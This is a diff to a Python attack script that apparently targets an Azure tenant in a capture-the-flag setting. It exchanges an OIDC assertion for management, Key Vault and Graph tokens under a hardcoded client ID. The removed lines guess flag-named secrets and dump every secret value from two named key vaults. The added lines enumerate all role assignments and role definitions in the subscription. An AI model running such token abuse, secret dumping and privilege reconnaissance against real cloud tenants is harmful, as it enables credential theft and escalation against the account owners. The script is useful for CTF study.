@@ -58,29 +58,25 @@ def q(u, tok, m="GET"):
 
 LA = "891fb158-e02c-4428-a885-53b811f369c0"
 LA_ARM = aad(LA, "https://management.azure.com/.default", assertion=oidc)
-LA_VAULT = aad(LA, "https://vault.azure.net/.default", assertion=oidc)
-LA_GRAPH = aad(LA, "https://graph.microsoft.com/.default", assertion=oidc)
-print("LA_TOKENS arm=%d vault=%d graph=%d" % (len(LA_ARM), len(LA_VAULT), len(LA_GRAPH)))
+print("LA_ARM", len(LA_ARM))
 
-for sec in ("flag", "FLAG", "flag.txt", "ctf", "secret", "admin-flag"):
-    s, b = ex("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/%s?api-version=7.4" % sec,
-              headers={"Authorization": "Bearer " + LA_VAULT})
-    print("SEC_FLAG", sec, s, b[:600])
+# All role assignments in the subscription
+s, b = q("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % SUB, ARM)
+rdefs = {}
+if s == 200:
+    ras = json.loads(b).get("value", [])
+    print("RA_COUNT", len(ras))
+    for ra in ras:
+        p = ra["properties"]
+        print("SUBRA", p["principalId"], p["roleDefinitionId"].split("/")[-1], "|", p["scope"])
+else:
+    print("SUBRA_ERR", s, b[:300])
 
-for vault in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
-    s, b = ex("https://%s.vault.azure.net/secrets?api-version=7.4" % vault,
-              headers={"Authorization": "Bearer " + LA_VAULT})
-    print("VAULT_LIST", vault, s, b[:2000])
-    if s == 200:
-        for it in json.loads(b).get("value", []):
-            name = it["id"].rsplit("/", 1)[-1]
-            s2, b2 = ex(it["id"] + "?api-version=7.4", headers={"Authorization": "Bearer " + LA_VAULT})
-            print("SECRET_VAL", vault, name, s2, b2[:800])
+# resolve role def names
+s, b = q("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01" % SUB, ARM)
+if s == 200:
+    for rd in json.loads(b).get("value", []):
+        rdefs[rd["name"]] = rd["properties"]["roleName"]
+    print("RDEFS", json.dumps({k.split("-")[0]: v for k, v in list(rdefs.items())}))
 
-s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" % SUB, LA_ARM)
-try:
-    for r in json.loads(b).get("value", []):
-        print("LA_RES", r["type"], r["name"])
-except Exception:
-    print("LA_RES_ERR", s, b[:300])
 print("===Q_END===")
